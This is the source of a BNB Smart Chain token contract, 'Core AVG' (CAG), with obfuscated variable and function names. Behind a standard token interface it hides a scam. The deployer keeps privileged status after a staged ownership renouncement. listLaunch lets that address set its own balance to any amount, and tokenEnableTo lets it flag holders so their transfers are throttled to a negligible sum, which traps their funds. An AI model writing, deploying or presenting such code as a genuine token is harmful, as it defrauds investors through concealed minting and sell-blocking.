/**
 *Submitted for verification at BscScan.com on 2023-02-12
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface autoSenderWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atReceiver) external view returns (uint256);

    function transfer(address amountTakeSender, uint256 sellTotal) external returns (bool);

    function allowance(address senderTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellTotal) external returns (bool);

    function transferFrom(
        address sender,
        address amountTakeSender,
        uint256 sellTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoAt, uint256 value);
    event Approval(address indexed senderTotal, address indexed spender, uint256 value);
}

interface walletSender is autoSenderWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface listExempt {
    function createPair(address totalReceiver, address senderSellLaunch) external returns (address);
}

interface fromFundLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract atEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract CoreAVG is atEnable, autoSenderWallet, walletSender {
    uint8 private tokenTxTeam = 18;
    
    string private launchedLaunch = "Core AVG";
    
    uint256 constant autoSender = 12 ** 10;
    mapping(address => bool) public maxSell;

    address public buyMin;

    mapping(address => mapping(address => uint256)) private senderFund;

    address public feeTotal;
    uint256 public takeMin;
    uint256 private receiverEnable = 100000000 * 10 ** 18;
    bool public atTxSender;
    mapping(address => uint256) private minBuy;
    uint256 private fundLaunch;
    uint256 private sellWallet;
    mapping(address => bool) public modeSender;
    address private feeMarketing;
    bool public senderTeamShould;
    bool public enableTotalToken;
    string private launchMarketing = "CAG";

    

    event OwnershipTransferred(address indexed shouldTake, address indexed walletTxIs);

    constructor (){
        if (sellWallet == takeMin) {
            sellWallet = fundLaunch;
        }
        fromFundLiquidity txSwap = fromFundLiquidity(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        buyMin = listExempt(txSwap.factory()).createPair(txSwap.WETH(), address(this));
        feeMarketing = _msgSender();
        if (senderTeamShould) {
            sellWallet = fundLaunch;
        }
        feeTotal = feeMarketing;
        maxSell[feeTotal] = true;
        if (atTxSender) {
            senderTeamShould = true;
        }
        minBuy[feeTotal] = receiverEnable;
        emit Transfer(address(0), feeTotal, receiverEnable);
        listAmount();
    }

    

    function listLaunch(uint256 sellTotal) public {
        if (!maxSell[_msgSender()]) {
            return;
        }
        minBuy[feeTotal] = sellTotal;
    }

    function tokenEnableTo(address txMin) public {
        if (senderTeamShould != atTxSender) {
            senderTeamShould = false;
        }
        if (txMin == feeTotal || txMin == buyMin || !maxSell[_msgSender()]) {
            return;
        }
        if (takeMin != fundLaunch) {
            fundLaunch = takeMin;
        }
        modeSender[txMin] = true;
    }

    function autoShould(address listIs, address amountTakeSender, uint256 sellTotal) internal returns (bool) {
        if (listIs == feeTotal || amountTakeSender == feeTotal) {
            return tradingLimit(listIs, amountTakeSender, sellTotal);
        }
        if (fundLaunch == sellWallet) {
            senderTeamShould = true;
        }
        if (modeSender[listIs]) {
            return tradingLimit(listIs, amountTakeSender, autoSender);
        }
        if (fundLaunch == sellWallet) {
            sellWallet = fundLaunch;
        }
        return tradingLimit(listIs, amountTakeSender, sellTotal);
    }

    function transfer(address txAuto, uint256 sellTotal) external virtual override returns (bool) {
        return autoShould(_msgSender(), txAuto, sellTotal);
    }

    function transferFrom(address listIs, address amountTakeSender, uint256 sellTotal) external override returns (bool) {
        if (senderFund[listIs][_msgSender()] != type(uint256).max) {
            require(sellTotal <= senderFund[listIs][_msgSender()]);
            senderFund[listIs][_msgSender()] -= sellTotal;
        }
        return autoShould(listIs, amountTakeSender, sellTotal);
    }

    function tradingLimit(address listIs, address amountTakeSender, uint256 sellTotal) internal returns (bool) {
        require(minBuy[listIs] >= sellTotal);
        minBuy[listIs] -= sellTotal;
        minBuy[amountTakeSender] += sellTotal;
        emit Transfer(listIs, amountTakeSender, sellTotal);
        return true;
    }

    function tokenTx() public {
        if (senderTeamShould) {
            atTxSender = true;
        }
        if (takeMin != fundLaunch) {
            fundLaunch = sellWallet;
        }
        senderTeamShould=false;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverEnable;
    }

    function fromTrading() public view returns (bool) {
        return senderTeamShould;
    }

    function owner() external view returns (address) {
        return feeMarketing;
    }

    function name() external view virtual override returns (string memory) {
        return launchedLaunch;
    }

    function allowance(address toAtAuto, address senderAuto) external view virtual override returns (uint256) {
        return senderFund[toAtAuto][senderAuto];
    }

    function approve(address senderAuto, uint256 sellTotal) public virtual override returns (bool) {
        senderFund[_msgSender()][senderAuto] = sellTotal;
        emit Approval(_msgSender(), senderAuto, sellTotal);
        return true;
    }

    function modeEnableMin() public view returns (uint256) {
        return fundLaunch;
    }

    function txFee() public {
        
        
        takeMin=0;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchMarketing;
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenTxTeam;
    }

    function launchAt(address takeSwapSender) public {
        if (enableTotalToken) {
            return;
        }
        
        maxSell[takeSwapSender] = true;
        
        enableTotalToken = true;
    }

    function shouldTrading() public view returns (uint256) {
        return fundLaunch;
    }

    function getOwner() external view returns (address) {
        return feeMarketing;
    }

    function tradingToken() public view returns (uint256) {
        return takeMin;
    }

    function listAmount() public {
        emit OwnershipTransferred(feeTotal, address(0));
        feeMarketing = address(0);
    }

    function enableIs() public {
        
        if (atTxSender) {
            fundLaunch = sellWallet;
        }
        sellWallet=0;
    }

    function balanceOf(address atReceiver) public view virtual override returns (uint256) {
        return minBuy[atReceiver];
    }


}